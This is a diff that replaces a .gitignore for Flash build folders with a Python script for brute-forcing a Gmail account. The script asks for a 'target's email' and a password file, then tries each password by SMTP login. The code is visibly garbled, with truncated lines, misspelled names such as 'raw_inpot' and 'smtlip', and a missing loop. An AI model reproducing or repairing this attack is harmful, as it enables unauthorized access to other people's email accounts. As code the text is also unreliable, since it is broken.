@@ -1,18 +1,14 @@
-# Build and Release Folders
-bin-debug/
-bin-release/
-[Oo]bj/
-[Bb]in/
+import smtplib
+smtpserver = smtplib.SMTP('smtp.gmail.com',$
+smtpserver.ehlo()
+smtpserver.starttls()
 
-# Other files and folders
-.settings/
-
-# Executables
-*.swf
-*.air
-*.ipa
-*.apk
-
-# Project files, i.e. `.project`, `.actionScriptProperties` and `.flexProperties`
-# should NOT be excluded as they contain compiler settings and other important
-# information for Eclipse / Flash Builder.
+user = raw_input("Enter the targets'email :$
+passwfile = raw_inpot ("Enter the password $
+passwfile = open(passwrdfile, "r")
+        try :
+                smtpserver.login( user , pa$
+                print("[+] Password Find ==$
+                break;
+        except smtlip.STPAthenticationEror:
+                print ("[!] Password is inc$
